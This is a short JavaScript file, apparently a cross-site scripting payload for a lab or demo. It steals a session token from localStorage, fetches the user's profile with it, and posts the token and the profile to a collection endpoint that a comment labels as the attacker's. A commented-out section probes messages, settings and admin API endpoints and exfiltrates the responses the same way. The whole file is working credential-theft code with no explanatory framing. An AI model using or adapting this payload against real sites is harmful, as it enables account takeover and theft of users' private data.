(function () {
    const token = localStorage.getItem('token');
  
    if (!token) return;
  
    const authHeader = { Authorization: `Bearer ${token}` };
  
    // Step 1: Fetch user info
    fetch('http://localhost:4000/api/user', {
      headers: authHeader
    })
      .then(res => res.json())
      .then(user => {
        // Step 2: Send token and user info to attacker
        fetch('http://localhost:9000/stolen', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            source: location.origin,
            token,
            user
          })
        }).catch(console.error);
      }).catch(console.error);
  
    // Step 3: Probe other backend endpoints
    // const endpoints = ['/api/messages', '/api/settings', '/api/admin'];
    // endpoints.forEach(path => {
    //   fetch(`http://localhost:4000${path}`, {
    //     headers: authHeader
    //   })
    //     .then(res => res.json().then(data => ({
    //       status: res.status,
    //       path,
    //       data
    //     })))
    //     .then(result => {
    //       fetch('http://localhost:9000/stolen', {
    //         method: 'POST',
    //         headers: { 'Content-Type': 'application/json' },
    //         body: JSON.stringify({
    //           source: location.origin,
    //           token,
    //           ...result
    //         })
    //       }).catch(console.error);
    //     })
    //     .catch(err => {
    //       // In case of error (403/401 etc.)
    //       fetch('http://localhost:9000/stolen', {
    //         method: 'POST',
    //         headers: { 'Content-Type': 'application/json' },
    //         body: JSON.stringify({
    //           source: location.origin,
    //           token,
    //           path,
    //           error: err.message
    //         })
    //       }).catch(console.error);
    //     });
    // });
  })();
  